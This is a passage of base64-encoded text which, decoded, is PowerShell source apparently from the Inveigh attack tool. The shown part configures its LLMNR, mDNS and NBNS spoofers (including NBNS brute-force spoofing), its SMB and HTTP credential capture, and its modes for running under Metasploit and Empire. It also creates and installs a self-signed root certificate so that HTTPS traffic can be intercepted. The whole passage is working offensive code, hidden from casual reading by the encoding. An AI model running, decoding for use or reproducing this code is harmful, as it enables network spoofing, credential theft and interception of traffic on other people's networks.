XEgJ1knIC1hbmQgISRlbGV2YXRlZF9wcml2aWxlZ2UpCiAgICB7CiAgICAgICAgJExMTU5SX3BvcnRfY2hlY2sgPSBuZXRzdGF0IC1hbnAgVURQIHwgZmluZHN0ciAvQzoiMC4wLjAuMDo1MzU1ICIKICAgIH0KCiAgICBpZigkbUROUyAtZXEgJ1knIC1hbmQgISRlbGV2YXRlZF9wcml2aWxlZ2UpCiAgICB7CiAgICAgICAgJG1ETlNfcG9ydF9jaGVjayA9IG5ldHN0YXQgLWFucCBVRFAgfCBmaW5kc3RyIC9DOiIwLjAuMC4wOjUzNTMgIgogICAgfQoKfQoKaWYoISRlbGV2YXRlZF9wcml2aWxlZ2UpCnsKCiAgICBpZigkSFRUUFMgLWVxICdZJykKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQgIkVycm9yOi1IVFRQUyByZXF1aXJlcyBlbGV2YXRlZCBwcml2aWxlZ2VzIgogICAgICAgIHRocm93CiAgICB9CgogICAgaWYoJFNwb29mZXJMZWFybmluZyAtZXEgJ1knKQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiRXJyb3I6LVNwb29mZXJMZWFybmluZyByZXF1aXJlcyBlbGV2YXRlZCBwcml2aWxlZ2VzIgogICAgICAgIHRocm93CiAgICB9CgogICAgJE5CTlMgPSAiWSIKICAgICRTTUIgPSAiTiIKCn0KCiRpbnZlaWdoLmhvc3RuYW1lX3Nwb29mID0gJGZhbHNlCiRpbnZlaWdoLnJ1bm5pbmcgPSAkdHJ1ZQoKaWYoJFN0YXR1c091dHB1dCAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfb3V0cHV0ID0gJHRydWUKfQplbHNlCnsKICAgICRpbnZlaWdoLnN0YXR1c19vdXRwdXQgPSAkZmFsc2UKfQoKaWYoJE91dHB1dFN0cmVhbU9ubHkgLWVxICdZJykKewogICAgJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5ID0gJHRydWUKfQplbHNlCnsKICAgICRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSA9ICRmYWxzZQp9CgppZigkSW5zcGVjdCkKewoKICAgIGlmKCRlbGV2YXRlZF9wcml2aWxlZ2UpCiAgICB7CiAgICAgICAgJExMTU5SID0gIk4iCiAgICAgICAgJG1ETlMgPSAiTiIKICAgICAgICAkTkJOUyA9ICJOIgogICAgICAgICRIVFRQID0gIk4iCiAgICAgICAgJEhUVFBTID0gIk4iCiAgICAgICAgJFByb3h5ID0gIk4iCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJEhUVFAgPSAiTiIKICAgICAgICAkSFRUUFMgPSAiTiIKICAgICAgICAkUHJveHkgPSAiTiIKICAgIH0KCn0KCmlmKCRUb29sIC1lcSAxKSAjIE1ldGFzcGxvaXQgSW50ZXJhY3RpdmUgUG93ZXJTaGVsbCBQYXlsb2FkcyBhbmQgTWV0ZXJwcmV0ZXIncyBQb3dlclNoZWxsIEV4dGVuc2lvbgp7CiAgICAkaW52ZWlnaC50b29sID0gMQogICAgJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5ID0gJHRydWUKICAgICRpbnZlaWdoLm5ld2xpbmUgPSAiIgogICAgJENvbnNvbGVPdXRwdXQgPSAiTiIKCn0KZWxzZWlmKCRUb29sIC1lcSAyKSAjIFBvd2VyU2hlbGwgRW1waXJlCnsKICAgICRpbnZlaWdoLnRvb2wgPSAyCiAgICAkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkgPSAkdHJ1ZQogICAgJGludmVpZ2guY29uc29sZV9pbnB1dCA9ICRmYWxzZQogICAgJGludmVpZ2gubmV3bGluZSA9ICJgbiIgIyByZW1vdmUgZm9yIEVtcGlyZSAyLjAKICAgICRMb2dPdXRwdXQgPSAiTiIKICAgICRTaG93SGVscCA9ICJOIgoKICAgIHN3aXRjaCAoJENvbnNvbGVPdXRwdXQpCiAgICB7CgogICAgICAgICdMb3cnCiAgICAgICAgewogICAgICAgICAgICAkQ29uc29sZU91dHB1dCA9ICJMb3ciCiAgICAgICAgfQoKICAgICAgICAnTWVkaXVtJwogICAgICAgIHsKICAgICAgICAgICAgJENvbnNvbGVPdXRwdXQgPSAiTWVkaXVtIgogICAgICAgIH0KCiAgICAgICAgZGVmYXVsdAogICAgICAgIHsKICAgICAgICAgICAgJENvbnNvbGVPdXRwdXQgPSAiWSIKICAgICAgICB9CgogICAgfQoKfQplbHNlCnsKICAgICRpbnZlaWdoLnRvb2wgPSAwCiAgICAkaW52ZWlnaC5uZXdsaW5lID0gIiIKfQoKIyBXcml0ZSBzdGFydHVwIG1lc3NhZ2VzCiRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkludmVpZ2ggJGludmVpZ2hfdmVyc2lvbiBzdGFydGVkIGF0ICQoR2V0LURhdGUgLWZvcm1hdCAncycpIikgID4gJG51bGwKCmlmKCRGaWxlT3V0cHV0IC1lcSAnWScpCnsKICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoICRpbnZlaWdoX3ZlcnNpb24gc3RhcnRlZCIpID4gJG51bGwKfQoKaWYoJExvZ091dHB1dCAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggc3RhcnRlZCIpID4gJG51bGwKICAgICRpbnZlaWdoLmxvZ19vdXRwdXQgPSAkdHJ1ZQp9CmVsc2UKewogICAgJGludmVpZ2gubG9nX291dHB1dCA9ICRmYWxzZQp9CgppZigkRWxldmF0ZWRQcml2aWxlZ2UgLWVxICdZJyAtb3IgJGVsZXZhdGVkX3ByaXZpbGVnZSkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiRWxldmF0ZWQgUHJpdmlsZWdlIE1vZGUgPSBFbmFibGVkIikgID4gJG51bGwKfQplbHNlCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkVsZXZhdGVkIFByaXZpbGVnZSBNb2RlID0gRGlzYWJsZWQiKSAgPiAkbnVsbAp9CgppZigkZmlyZXdhbGxfc3RhdHVzKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJXaW5kb3dzIEZpcmV3YWxsID0gRW5hYmxlZCIpICA+ICRudWxsCiAgICAkZmlyZXdhbGxfcnVsZXMgPSBOZXctT2JqZWN0IC1jb21PYmplY3QgSE5ldENmZy5Gd1BvbGljeTIKICAgICRmaXJld2FsbF9wb3dlcnNoZWxsID0gJGZpcmV3YWxsX3J1bGVzLnJ1bGVzIHwgV2hlcmUtT2JqZWN0IHskXy5FbmFibGVkIC1lcSAkdHJ1ZSAtYW5kICRfLkRpcmVjdGlvbiAtZXEgMX0gfFNlbGVjdC1PYmplY3QgLVByb3BlcnR5IE5hbWUgfCBTZWxlY3QtU3RyaW5nICJXaW5kb3dzIFBvd2VyU2hlbGx9IgoKICAgIGlmKCRmaXJld2FsbF9wb3dlcnNoZWxsKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIldpbmRvd3MgRmlyZXdhbGwgLSBQb3dlclNoZWxsLmV4ZSA9IEFsbG93ZWQiKSAgPiAkbnVsbAogICAgfQoKfQoKJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUHJpbWFyeSBJUCBBZGRyZXNzID0gJElQIikgID4gJG51bGwKCmlmKCRMTE1OUiAtZXEgJ1knIC1vciAkbUROUyAtZXEgJ1knIC1vciAkTkJOUyAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJMTE1OUi9tRE5TL05CTlMgU3Bvb2ZlciBJUCBBZGRyZXNzID0gJFNwb29mZXJJUCIpICA+ICRudWxsCn0KCmlmKCRMTE1OUiAtZXEgJ1knKQp7CgogICAgaWYoJGVsZXZhdGVkX3ByaXZpbGVnZSAtb3IgISRMTE1OUl9wb3J0X2NoZWNrKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkxMTU5SIFNwb29mZXIgPSBFbmFibGVkIikgID4gJG51bGwKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJMTE1OUiBUVEwgPSAkTExNTlJUVEwgU2Vjb25kcyIpICA+ICRudWxsCiAgICAgICAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSByZXNwb25zZSBzZW50IgogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRMTE1OUiA9ICJOIgogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkxMTU5SIFNwb29mZXIgRGlzYWJsZWQgRHVlIFRvIEluIFVzZSBQb3J0IDUzNTUiKSAgPiAkbnVsbAogICAgfQoKfQplbHNlCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkxMTU5SIFNwb29mZXIgPSBEaXNhYmxlZCIpICA+ICRudWxsCiAgICAkTExNTlJfcmVzcG9uc2VfbWVzc2FnZSA9ICItIExMTU5SIHNwb29mZXIgaXMgZGlzYWJsZWQiCn0KCmlmKCRtRE5TIC1lcSAnWScpCnsKCiAgICBpZigkZWxldmF0ZWRfcHJpdmlsZWdlIC1vciAhJG1ETlNfcG9ydF9jaGVjaykKICAgIHsKICAgICAgICAkbUROU1R5cGVzX291dHB1dCA9ICRtRE5TVHlwZXMgLWpvaW4gIiwiCgogICAgICAgIGlmKCRtRE5TVHlwZXMuQ291bnQgLWVxIDEpCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJtRE5TIFNwb29mZXIgRm9yIFR5cGUgJG1ETlNUeXBlc19vdXRwdXQgPSBFbmFibGVkIikgID4gJG51bGwKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgibUROUyBTcG9vZmVyIEZvciBUeXBlcyAkbUROU1R5cGVzX291dHB1dCA9IEVuYWJsZWQiKSAgPiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgibUROUyBUVEwgPSAkbUROU1RUTCBTZWNvbmRzIikgID4gJG51bGwKICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gcmVzcG9uc2Ugc2VudCIKCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJG1ETlMgPSAiTiIKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJtRE5TIFNwb29mZXIgRGlzYWJsZWQgRHVlIFRvIEluIFVzZSBQb3J0IDUzNTMiKSAgPiAkbnVsbAogICAgfQoKfQplbHNlCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIm1ETlMgU3Bvb2ZlciA9IERpc2FibGVkIikgID4gJG51bGwKICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBtRE5TIHNwb29mZXIgaXMgZGlzYWJsZWQiCn0KCmlmKCROQk5TIC1lcSAnWScpCnsKICAgICROQk5TVHlwZXNfb3V0cHV0ID0gJE5CTlNUeXBlcyAtam9pbiAiLCIKICAgICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSByZXNwb25zZSBzZW50IgogICAgCiAgICBpZigkTkJOU1R5cGVzLkNvdW50IC1lcSAxKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIk5CTlMgU3Bvb2ZlciBGb3IgVHlwZSAkTkJOU1R5cGVzX291dHB1dCA9IEVuYWJsZWQiKSAgPiAkbnVsbAogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIk5CTlMgU3Bvb2ZlciBGb3IgVHlwZXMgJE5CTlNUeXBlc19vdXRwdXQgPSBFbmFibGVkIikgID4gJG51bGwKICAgIH0KCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJOQk5TIFNwb29mZXIgPSBEaXNhYmxlZCIpICA+ICRudWxsCiAgICAkTkJOU19yZXNwb25zZV9tZXNzYWdlID0gIi0gTkJOUyBzcG9vZmVyIGlzIGRpc2FibGVkIgp9CgppZigkTkJOU0JydXRlRm9yY2UgLWVxICdZJykKeyAgIAogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiTkJOUyBCcnV0ZSBGb3JjZSBTcG9vZmVyIFRhcmdldCA9ICROQk5TQnJ1dGVGb3JjZVRhcmdldCIpID4gJG51bGwKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIk5CTlMgQnJ1dGUgRm9yY2UgU3Bvb2ZlciBJUCBBZGRyZXNzID0gJFNwb29mZXJJUCIpID4gJG51bGwKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIk5CTlMgQnJ1dGUgRm9yY2UgU3Bvb2ZlciBIb3N0bmFtZSA9ICROQk5TQnJ1dGVGb3JjZUhvc3QiKSA+ICRudWxsCgogICAgaWYoJE5CTlNCcnV0ZUZvcmNlUGF1c2UpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiTkJOUyBCcnV0ZSBGb3JjZSBQYXVzZSA9ICROQk5TQnJ1dGVGb3JjZVBhdXNlIFNlY29uZHMiKSA+ICRudWxsCiAgICB9Cgp9CgppZigkTkJOUyAtZXEgJ1knIC1vciAkTkJOU0JydXRlRm9yY2UgLWVxICdZJykKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiTkJOUyBUVEwgPSAkTkJOU1RUTCBTZWNvbmRzIikgPiAkbnVsbAp9CgppZigkU3Bvb2ZlckxlYXJuaW5nIC1lcSAnWScgLWFuZCAoJExMTU5SIC1lcSAnWScgLW9yICROQk5TIC1lcSAnWScpKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJTcG9vZmVyIExlYXJuaW5nID0gRW5hYmxlZCIpICA+ICRudWxsCgogICAgaWYoJFNwb29mZXJMZWFybmluZ0RlbGF5IC1lcSAxKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlNwb29mZXIgTGVhcm5pbmcgRGVsYXkgPSAkU3Bvb2ZlckxlYXJuaW5nRGVsYXkgTWludXRlIikgID4gJG51bGwKICAgIH0KICAgIGVsc2VpZigkU3Bvb2ZlckxlYXJuaW5nRGVsYXkgLWd0IDEpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU3Bvb2ZlciBMZWFybmluZyBEZWxheSA9ICRTcG9vZmVyTGVhcm5pbmdEZWxheSBNaW51dGVzIikgID4gJG51bGwKICAgIH0KICAgIAogICAgaWYoJFNwb29mZXJMZWFybmluZ0ludGVydmFsIC1lcSAxKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlNwb29mZXIgTGVhcm5pbmcgSW50ZXJ2YWwgPSAkU3Bvb2ZlckxlYXJuaW5nSW50ZXJ2YWwgTWludXRlIikgID4gJG51bGwKICAgIH0KICAgIGVsc2VpZigkU3Bvb2ZlckxlYXJuaW5nSW50ZXJ2YWwgLWVxIDApCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU3Bvb2ZlciBMZWFybmluZyBJbnRlcnZhbCA9IERpc2FibGVkIikgID4gJG51bGwKICAgIH0KICAgIGVsc2VpZigkU3Bvb2ZlckxlYXJuaW5nSW50ZXJ2YWwgLWd0IDEpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU3Bvb2ZlciBMZWFybmluZyBJbnRlcnZhbCA9ICRTcG9vZmVyTGVhcm5pbmdJbnRlcnZhbCBNaW51dGVzIikgID4gJG51bGwKICAgIH0KCn0KCmlmKCRTcG9vZmVySG9zdHNSZXBseSAtYW5kICgkTExNTlIgLWVxICdZJyAtb3IgJE5CTlMgLWVxICdZJykpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlNwb29mZXIgSG9zdHMgUmVwbHkgPSAiICsgKCRTcG9vZmVySG9zdHNSZXBseSAtam9pbiAiLCIpKSAgPiAkbnVsbAp9CgppZigkU3Bvb2Zlckhvc3RzSWdub3JlIC1hbmQgKCRMTE1OUiAtZXEgJ1knIC1vciAkTkJOUyAtZXEgJ1knKSkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU3Bvb2ZlciBIb3N0cyBJZ25vcmUgPSAiICsgKCRTcG9vZmVySG9zdHNJZ25vcmUgLWpvaW4gIiwiKSkgID4gJG51bGwKfQoKaWYoJFNwb29mZXJJUHNSZXBseSAtYW5kICgkTExNTlIgLWVxICdZJyAtb3IgJE5CTlMgLWVxICdZJykpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlNwb29mZXIgSVBzIFJlcGx5ID0gIiArICgkU3Bvb2ZlcklQc1JlcGx5IC1qb2luICIsIikpICA+ICRudWxsCn0KCmlmKCRTcG9vZmVySVBzSWdub3JlIC1hbmQgKCRMTE1OUiAtZXEgJ1knIC1vciAkTkJOUyAtZXEgJ1knKSkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU3Bvb2ZlciBJUHMgSWdub3JlID0gIiArICgkU3Bvb2ZlcklQc0lnbm9yZSAtam9pbiAiLCIpKSAgPiAkbnVsbAp9CgppZigkU3Bvb2ZlclJlcGVhdCAtZXEgJ04nKQp7CiAgICAkaW52ZWlnaC5zcG9vZmVyX3JlcGVhdCA9ICRmYWxzZQogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU3Bvb2ZlciBSZXBlYXRpbmcgPSBEaXNhYmxlZCIpICA+ICRudWxsCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zcG9vZmVyX3JlcGVhdCA9ICR0cnVlCn0KCmlmKCRTTUIgLWVxICdZJyAtYW5kICRlbGV2YXRlZF9wcml2aWxlZ2UpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlNNQiBDYXB0dXJlID0gRW5hYmxlZCIpICA+ICRudWxsCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJTTUIgQ2FwdHVyZSA9IERpc2FibGVkIikgID4gJG51bGwKfQoKaWYoJEhUVFAgLWVxICdZJykKewoKICAgIGlmKCRIVFRQX3BvcnRfY2hlY2spCiAgICB7CiAgICAgICAgJEhUVFAgPSAiTiIKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQIENhcHR1cmUgRGlzYWJsZWQgRHVlIFRvIEluIFVzZSBQb3J0ICRIVFRQUG9ydCIpICA+ICRudWxsCiAgICB9CiAgICBlbHNlCiAgICB7CgogICAgICAgIGlmKCRIVFRQSVAgLW5lICcwLjAuMC4wJykKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgSVAgPSAkSFRUUElQIikgPiAkbnVsbAogICAgICAgIH0KCiAgICAgICAgaWYoJEhUVFBQb3J0IC1uZSA4MCkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgUG9ydCA9ICRIVFRQUG9ydCIpID4gJG51bGwKICAgICAgICB9CgogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgQ2FwdHVyZSA9IEVuYWJsZWQiKSAgPiAkbnVsbAogICAgfQoKfQplbHNlCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgQ2FwdHVyZSA9IERpc2FibGVkIikgID4gJG51bGwKfQoKaWYoJEhUVFBTIC1lcSAnWScpCnsKCiAgICBpZigkSFRUUFNfcG9ydF9jaGVjaykKICAgIHsKICAgICAgICAkSFRUUFMgPSAiTiIKICAgICAgICAkaW52ZWlnaC5IVFRQUyA9ICRmYWxzZQogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIENhcHR1cmUgRGlzYWJsZWQgRHVlIFRvIEluIFVzZSBQb3J0ICRIVFRQU1BvcnQiKSAgPiAkbnVsbAogICAgfQogICAgZWxzZQogICAgewoKICAgICAgICB0cnkKICAgICAgICB7IAogICAgICAgICAgICAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV9pc3N1ZXIgPSAkSFRUUFNDZXJ0SXNzdWVyCiAgICAgICAgICAgICRpbnZlaWdoLmNlcnRpZmljYXRlX0NOID0gJEhUVFBTQ2VydFN1YmplY3QKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUFMgQ2VydGlmaWNhdGUgSXNzdWVyID0gIiArICRpbnZlaWdoLmNlcnRpZmljYXRlX2lzc3VlcikgID4gJG51bGwKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUFMgQ2VydGlmaWNhdGUgQ04gPSAiICsgJGludmVpZ2guY2VydGlmaWNhdGVfQ04pICA+ICRudWxsCiAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9jaGVjayA9IChHZXQtQ2hpbGRJdGVtIENlcnQ6XExvY2FsTWFjaGluZVxNeSB8IFdoZXJlLU9iamVjdCB7JF8uSXNzdWVyIC1MaWtlICJDTj0iICsgJGludmVpZ2guY2VydGlmaWNhdGVfaXNzdWVyfSkKCiAgICAgICAgICAgIGlmKCEkY2VydGlmaWNhdGVfY2hlY2spCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICMgY3JlZGl0IHRvIHN1YlRlZSBmb3IgY2VydCBjcmVhdGlvbiBjb2RlIGh0dHBzOi8vZ2l0aHViLmNvbS9zdWJUZWUvSW50ZXJjZXB0b3IKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9kaXN0aW5ndWlzaGVkX25hbWUgPSBuZXctb2JqZWN0IC1jb20gIlg1MDlFbnJvbGxtZW50LkNYNTAwRGlzdGluZ3Vpc2hlZE5hbWUiCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfZGlzdGluZ3Vpc2hlZF9uYW1lLkVuY29kZSggIkNOPSIgKyAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV9DTiwgJGNlcnRpZmljYXRlX2Rpc3Rpbmd1aXNoZWRfbmFtZS5YNTAwTmFtZUZsYWdzLlg1MDBOYW1lRmxhZ3MuWENOX0NFUlRfTkFNRV9TVFJfTk9ORSkKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9pc3N1ZXJfZGlzdGluZ3Vpc2hlZF9uYW1lID0gbmV3LW9iamVjdCAtY29tICJYNTA5RW5yb2xsbWVudC5DWDUwMERpc3Rpbmd1aXNoZWROYW1lIgogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX2lzc3Vlcl9kaXN0aW5ndWlzaGVkX25hbWUuRW5jb2RlKCJDTj0iICsgJGludmVpZ2guY2VydGlmaWNhdGVfaXNzdWVyLCAkY2VydGlmaWNhdGVfZGlzdGluZ3Vpc2hlZF9uYW1lLlg1MDBOYW1lRmxhZ3MuWDUwME5hbWVGbGFncy5YQ05fQ0VSVF9OQU1FX1NUUl9OT05FKQogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX2tleSA9IG5ldy1vYmplY3QgLWNvbSAiWDUwOUVucm9sbG1lbnQuQ1g1MDlQcml2YXRlS2V5IgogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX2tleS5Qcm92aWRlck5hbWUgPSAiTWljcm9zb2Z0IEVuaGFuY2VkIFJTQSBhbmQgQUVTIENyeXB0b2dyYXBoaWMgUHJvdmlkZXIiCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfa2V5LktleVNwZWMgPSAyCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfa2V5Lkxlbmd0aCA9IDIwNDgKCQkJICAgICRjZXJ0aWZpY2F0ZV9rZXkuTWFjaGluZUNvbnRleHQgPSAxCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfa2V5LkNyZWF0ZSgpCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc2VydmVyX2F1dGhfT0lEID0gbmV3LW9iamVjdCAtY29tICJYNTA5RW5yb2xsbWVudC5DT2JqZWN0SWQiCgkJCSAgICAkY2VydGlmaWNhdGVfc2VydmVyX2F1dGhfT0lELkluaXRpYWxpemVGcm9tVmFsdWUoIjEuMy42LjEuNS41LjcuMy4xIikKCQkJICAgICRjZXJ0aWZpY2F0ZV9lbmhhbmNlZF9rZXlfdXNhZ2VfT0lEID0gbmV3LW9iamVjdCAtY29tICJYNTA5RW5yb2xsbWVudC5DT2JqZWN0SWRzLjEiCgkJCSAgICAkY2VydGlmaWNhdGVfZW5oYW5jZWRfa2V5X3VzYWdlX09JRC5hZGQoJGNlcnRpZmljYXRlX3NlcnZlcl9hdXRoX09JRCkKCQkJICAgICRjZXJ0aWZpY2F0ZV9lbmhhbmNlZF9rZXlfdXNhZ2VfZXh0ZW5zaW9uID0gbmV3LW9iamVjdCAtY29tICJYNTA5RW5yb2xsbWVudC5DWDUwOUV4dGVuc2lvbkVuaGFuY2VkS2V5VXNhZ2UiCgkJCSAgICAkY2VydGlmaWNhdGVfZW5oYW5jZWRfa2V5X3VzYWdlX2V4dGVuc2lvbi5Jbml0aWFsaXplRW5jb2RlKCRjZXJ0aWZpY2F0ZV9lbmhhbmNlZF9rZXlfdXNhZ2VfT0lEKQoJCQkgICAgJGNlcnRpZmljYXRlID0gbmV3LW9iamVjdCAtY29tICJYNTA5RW5yb2xsbWVudC5DWDUwOUNlcnRpZmljYXRlUmVxdWVzdENlcnRpZmljYXRlIgoJCQkgICAgJGNlcnRpZmljYXRlLkluaXRpYWxpemVGcm9tUHJpdmF0ZUtleSgyLCRjZXJ0aWZpY2F0ZV9rZXksIiIpCgkJCSAgICAkY2VydGlmaWNhdGUuU3ViamVjdCA9ICRjZXJ0aWZpY2F0ZV9kaXN0aW5ndWlzaGVkX25hbWUKCQkJICAgICRjZXJ0aWZpY2F0ZS5Jc3N1ZXIgPSAkY2VydGlmaWNhdGVfaXNzdWVyX2Rpc3Rpbmd1aXNoZWRfbmFtZQoJCQkgICAgJGNlcnRpZmljYXRlLk5vdEJlZm9yZSA9IChnZXQtZGF0ZSkuQWRkRGF5cygtMjcxKQoJCQkgICAgJGNlcnRpZmljYXRlLk5vdEFmdGVyID0gJGNlcnRpZmljYXRlLk5vdEJlZm9yZS5BZGREYXlzKDgyNCkKCQkJICAgICRjZXJ0aWZpY2F0ZV9oYXNoX2FsZ29yaXRobV9PSUQgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgWDUwOUVucm9sbG1lbnQuQ09iamVjdElkCgkJCSAgICAkY2VydGlmaWNhdGVfaGFzaF9hbGdvcml0aG1fT0lELkluaXRpYWxpemVGcm9tQWxnb3JpdGhtTmFtZSgxLDAsMCwiU0hBMjU2IikKCQkJICAgICRjZXJ0aWZpY2F0ZS5IYXNoQWxnb3JpdGhtID0gJGNlcnRpZmljYXRlX2hhc2hfYWxnb3JpdGhtX09JRAogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlLlg1MDlFeHRlbnNpb25zLkFkZCgkY2VydGlmaWNhdGVfZW5oYW5jZWRfa2V5X3VzYWdlX2V4dGVuc2lvbikKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9iYXNpY19jb25zdHJhaW50cyA9IG5ldy1vYmplY3QgLWNvbSAiWDUwOUVucm9sbG1lbnQuQ1g1MDlFeHRlbnNpb25CYXNpY0NvbnN0cmFpbnRzIgoJCQkgICAgJGNlcnRpZmljYXRlX2Jhc2ljX2NvbnN0cmFpbnRzLkluaXRpYWxpemVFbmNvZGUoInRydWUiLDEpCiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGUuWDUwOUV4dGVuc2lvbnMuQWRkKCRjZXJ0aWZpY2F0ZV9iYXNpY19jb25zdHJhaW50cykKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZS5FbmNvZGUoKQogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX2Vucm9sbG1lbnQgPSBuZXctb2JqZWN0IC1jb20gIlg1MDlFbnJvbGxtZW50LkNYNTA5RW5yb2xsbWVudCIKCQkJICAgICRjZXJ0aWZpY2F0ZV9lbnJvbGxtZW50LkluaXRpYWxpemVGcm9tUmVxdWVzdCgkY2VydGlmaWNhdGUpCgkJCSAgICAkY2VydGlmaWNhdGVfZGF0YSA9ICRjZXJ0aWZpY2F0ZV9lbnJvbGxtZW50LkNyZWF0ZVJlcXVlc3QoMCkKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9lbnJvbGxtZW50Lkluc3RhbGxSZXNwb25zZSgyLCRjZXJ0aWZpY2F0ZV9kYXRhLDAsIiIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jZXJ0aWZpY2F0ZSA9IChHZXQtQ2hpbGRJdGVtIENlcnQ6XExvY2FsTWFjaGluZVxNeSB8IFdoZXJlLU9iamVjdCB7JF8uS